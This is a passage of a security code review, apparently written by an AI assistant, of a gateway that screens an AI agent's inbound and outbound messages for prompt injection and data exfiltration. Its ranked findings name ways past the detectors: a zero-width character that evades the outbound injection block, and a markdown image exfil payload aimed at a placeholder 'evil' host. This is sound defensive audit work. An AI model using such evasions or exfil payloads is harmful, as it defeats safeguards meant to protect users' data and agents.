- **record-store.ts sound and actually MORE correct than config-store:** its read-latest-then-insert
  happens INSIDE `BEGIN IMMEDIATE` (config-store's read is outside). Same honest unkeyed-chain
  limitation (tail-truncate / full consistent rewrite passes `verifyChain`; Phase-2 directory
  attestation is the real fix). Importantly, in the bin a `records.record()` throw is caught and
  converted to a `screen_error` BLOCK — a record-write failure fails CLOSED (nothing is delivered/sent
  unrecorded). Good. Note: like config-store, `verifyChain()` is never called by the gateway itself.
- **spawn.ts sound:** `spawn(process.execPath, [entry])` with no `shell:true` → no shell-injection
  surface; args are not attacker-influenced (the daemon composition root is the only caller). READY
  handshake with timeout→SIGKILL and exit-before-ready→reject. Phase-1 env inheritance
  (`...process.env`) is fine for a local sidecar; the INV-4 employee/gateway separation is Phase-2.

### [SEVERITY: MEDIUM] Inbound `redact`-without-content fails OPEN (delivers the ORIGINAL) — the outbound seam fails closed on the identical case
- **File:** `core/daemon/src/session-node-manager.ts:2166` (the `deliverContent` fallback in
  `ingestReceivedContent`) vs the outbound floor at `core/daemon/src/daemon.ts:~3330`
  (`redact_without_content` → block).
- **Invariant/behavior violated:** INV-1/IN-001 (sanitized content, not the raw peer bytes, reaches
  the agent) + fail-closed discipline. The outbound path treats "redact verdict with no content" as
  "the one place M9 could fail OPEN" and blocks; the inbound path does the OPPOSITE.
- **What's wrong:** `const deliverContent = disposition === "redact" && content !== undefined ?
  content : content_original`. If a `redact` verdict ever arrives without `content`, the ternary
  falls through to the ORIGINAL unsanitized bytes and DELIVERS them to the agent — the exact
  smuggled-Unicode / injection-marker / confusable payload sanitization was meant to strip. The
  symmetric outbound case is explicitly caught and blocked with a comment calling it out; the inbound
  case silently delivers.
- **How it could be exploited:** requires the gateway to emit a `redact` disposition with no content
  — unreachable via the current gateway (inbound.ts always encodes `content` on redact), so this is a
  latent/defense-in-depth gap, not a live exploit. But it is a genuine fail-OPEN default in the one
  direction where the delivered bytes are attacker-controlled, and it contradicts the fail-closed
  posture the outbound seam deliberately adopts two files over. Fix: on inbound `redact &&
  content === undefined`, treat as a TRANSIENT block (hold un-acked), never deliver the original.
- **Confidence:** certain on the asymmetry and the fall-through; latent (not currently reachable).

### [INFO] Batch 6 — inbound seam (session-node-manager.ts) + daemon outbound seam + types.ts reviewed; the wiring logic is otherwise sound
- **INV-5 inbound funnel CONFIRMED (when a real gateway is wired):** `screenInbound` runs once in
  `ingestReceivedContent`, after authenticity (hash cross-check) + dedup, before hold/buffer/append.
  All three inbound producers pass it — direct arrival (`session-node-manager.ts:2670`), daemon
  recover/park (`daemon.ts:2052`), and held-then-release (screened before holding, released
  already-screened). No content path bypasses it.
- **Terminal-vs-transient split is correct and well-reasoned:** a TERMINAL block (detector rejected
  the content: language/injection/oversize) is `screenedOut` — it leafs the ORIGINAL content hash at
  its CANONICAL index (via `appendSessionLeaf`, not arrival order) and is acked, but never buffered
  for the agent. This preserves leafIndex===canonicalSeq so the two parties' hash chains don't
  diverge by position and the bilateral seal cross-check still matches (their HIGH-1). A TRANSIENT
  block (gateway_unavailable / governance_timeout) leafs nothing and is NOT acked → stays un-acked
  for redelivery once the gateway recovers. Correct fail-closed hold.
- **The B1 concurrency re-check is a real fix, correctly applied:** the new `await screenInbound`
  reopened the check-then-append window that was previously atomic under Node's single thread; they
  re-run the dedup check after the await, and everything from there to the append is synchronous. So
  two racing ingests of the same hash (direct retry vs park-recovery on reconnect) can't produce two
  leaves. Sound.
- **Outbound seam (daemon.ts) — the redact leaf binds the ALTERED bytes** (`sendBytes`), so the
  transcript/leaf records what actually went on the wire, not the pre-redaction draft; the retry
  queue also enqueues `sendBytes`, so a retry can't leak the original. `governance_decisions` from
  the MCP tool is shape-validated and malformed maps are dropped (→ re-warn), never trusted blindly.
- **types.ts** just threads the `SecurityGatewayClient` interface through `DaemonConfig` and
  `SessionNodeManager` opts — the daemon holds ONLY the narrow two-method interface; all detection is
  in the separate gateway program (correct split per INV-4/CORE-001).

---

### [SEVERITY: HIGH] The gateway's config + record stores are PLAINTEXT `node:sqlite`, not the SQLCipher DB their story mandates
<!-- ↓↓↓ Opus 4.8, added 2026-07-09 in a later session — found sideways while chasing an npm warning ↓↓↓ -->
- **File:** `core/gateway/src/config/config-store.ts:134` and `core/gateway/src/records/record-store.ts:74`
  — both `this.#db = new DatabaseSync(dbPath)`, imported from `node:sqlite`, with no cipher key.
- **Invariant/behavior violated:** `M9-CFG-001`'s own behavior clause, verbatim: *"the gateway shall write
  it as a new append-only versioned row in its own **SQLCipher database (a separate file and key from the
  daemon's)**"*. `M9-DEFINITION-OF-DONE.md` line 85 repeats it: *"the gateway's own local SQLCipher DB"*.
  `M9-REC-001` stores into "CFG-001's DB or a sibling" and inherits the requirement.
- **What's wrong:** the store is unencrypted on disk. Both files carry a header comment justifying this —
  *"the daemon opens node:sqlite without a cipher key today, so this store matches that; SQLCipher-style
  key encryption is a cross-cutting gap shared with the daemon's DB"*. That was written 2026-06-23. It was
  **already false of the spec** at the time, and became false of the daemon two days later: PERSIST-002
  (2026-06-25) moved the daemon to SQLCipher (`openEncryptedDatabase`, `core/daemon/src/sqlcipher-db.ts`).
  The comment was never revisited. **This review read both files** — Batch 3 (config-store) and Batch 5
  (record-store) — **and did not flag it.** The comment reads as a deliberate, reasoned deferral, which is
  exactly why it slid past: it is an *invented* justification for a clause the story never granted.
- **How it could be exploited / what breaks:** anyone with read access to the operator's disk — another
  local process, a backup, a synced folder, a stolen laptop — reads the complete security-pass record log
  (every screened message's rule, category, offset, disposition: clean / redact / block / warn) and the
  governance config **including exactly which guards are loosened**. No private keys leak; those are in the
  daemon's SQLCipher DB. So: confidentiality + reconnaissance, not key compromise.
  **This directly amplifies finding #7 below.** #7 says a tampered local config DB is trusted until
  Phase-2 attestation, because nothing calls `verifyChain` at boot. Plaintext storage is what makes that
  tamper *trivial*: an attacker does not need to defeat encryption to rewrite the hash chain consistently —
  the file opens in any SQLite browser. Encryption at rest and the missing `verifyChain` are the two halves
  of the same hole; fixing only one leaves it open.
- **Confidence:** certain. Verified by reading both constructors and `M9-CFG-001.yaml`; the daemon's own
  `sqlcipher-db.ts` is the counter-example sitting one package away.
- **Remediation is tracked OUTSIDE M9**, as `DOD-CRYPTO-AT-REST-1` in `M8C-DEFINITION-OF-DONE.md` — this is
  local data custody (the daemon's SQLCipher domain), not the screening layer M9 owns. Constraints recorded
  there: `core/gateway` **cannot** import `core/daemon` (daemon depends on gateway, not the reverse), so
  `sqlcipher-db.ts` must be lifted out — but **not** into `core/crypto`, which `connect` depends on and
  which must never pull a native module into the MCP shim. Existing installs need a fail-closed
  plaintext→encrypted migration. Verified 2026-07-09 that **SQLCipher opens a plaintext SQLite file
  directly**, so `daemon/identity-migration.ts` (the third and only defensible `node:sqlite` user, which
  reads a legacy plaintext DB to migrate it) also converts with no migration risk, and the builtin can
  leave production entirely. A lint guard is already live (cello-client `9017836`): ESLint blocks
  `node:sqlite` across `core/*/src`, allowed in `__tests__`, with these three files quarantined in one
  visible allowlist.

## SUMMARY — as of end of the seam review (all gateway source + both seams read)

**Coverage:** every non-test source file under `core/gateway/src/` (detectors, screen compositions,
client, server, config store, record store, spawn, bin, types) plus the full daemon-seam diff
(`daemon.ts`, `session-node-manager.ts`, `cello-mcp.ts`, `types.ts`) has been read and recorded
above. Remaining unread: the test files (Tier 4, corroboration only) and the `trustless-cello`
server-side composition roots (noted as a caveat under the CRITICAL finding).

**The design is genuinely good.** The fail-closed plumbing (client/server/timeouts), the
loosen-confirm config gate, the hash-chained records (though see #2 — they are stored in the clear), the terminal-vs-transient inbound split, and
the RE2 discipline in the detectors are all correct and carefully reasoned. The detectors have
honest, documented coverage limits. This is not sloppy work.

**But the headline is the CRITICAL finding: the layer is not wired into the shipped daemon.** All of
the above runs only when a gateway sidecar is spawned and passed to `startDaemon` — and only the TEST
harness does that. `cello-daemon.ts` ships with `PassthroughGatewayClient` (always-allow). Until that
one integration gap is closed, everything else is moot in production.

**Ranked findings:**
1. **CRITICAL** — M9 is inert in the production daemon (passthrough default; sidecar never wired
   outside tests). Also: production should not be *able* to run passthrough (fail-closed at startup).
2. **HIGH** — the config + record stores are plaintext `node:sqlite`, not the SQLCipher DB `M9-CFG-001`
   mandates. Records and the governance config sit unencrypted on the operator's disk, and this is what
   makes #8's tamper trivial. *(Added 2026-07-09; this review read both files and missed it.)*
3. **MEDIUM** — outbound injection-artifact BLOCK evadable via a zero-width char (block-check runs
   before the invisible-strip; inbound has the right order, outbound inverts it).
4. **MEDIUM** — inbound `redact`-without-content fails OPEN (delivers the original), asymmetric with
   the outbound fail-closed floor. Latent, but a fail-open default in the wrong direction.
5. **MEDIUM** — path-based image-URL exfil (`![](http://evil/<data>)`) evades both the `?`-only image
   check and the entropy charset check.
6. **MEDIUM (consistency)** — outbound exfil artifact patterns use native RegExp, outside the
   project's RE2/ReDoS discipline; latent DoS→forced-timeout, and no guard against a future unsafe
   pattern being added.
7. **LOW** — secret redaction caps at 1000 matches/rule and outbound has no size cap → overflow
   secrets leak on a crafted high-volume message.
8. **LOW** — config store (and record store) never call `verifyChain` at gateway boot; a tampered
   local config DB is trusted until Phase-2 attestation exists. **See #2: plaintext storage is the
   other half of this hole — fixing only one leaves it open.**
9. **LOW / needs-Andre** — the IN-003 language allowlist is LIVE with blocking defaults (terminally
   drops all confident non-Latin inbound), which the DoD says is "not wired." Product decision, not a
   bypass (the heuristic is trivially evaded, so it's a false-positive risk, not a false-negative).

**Nothing found** that lets an attacker forge a verdict over the wire, that lets the daemon override
the PII/override gate, or that makes the fail-closed client silently allow — those were the highest-
value targets and they hold. The real exposure is #1 (not switched on) and the MEDIUM evasions of
specific detectors.

<!-- END OF REVIEW as of this pass. If resuming: the only substantive remaining work is (a) the
Tier-4 test files as corroboration, and (b) confirming the trustless-cello server-side roots. The
source review is complete. -->


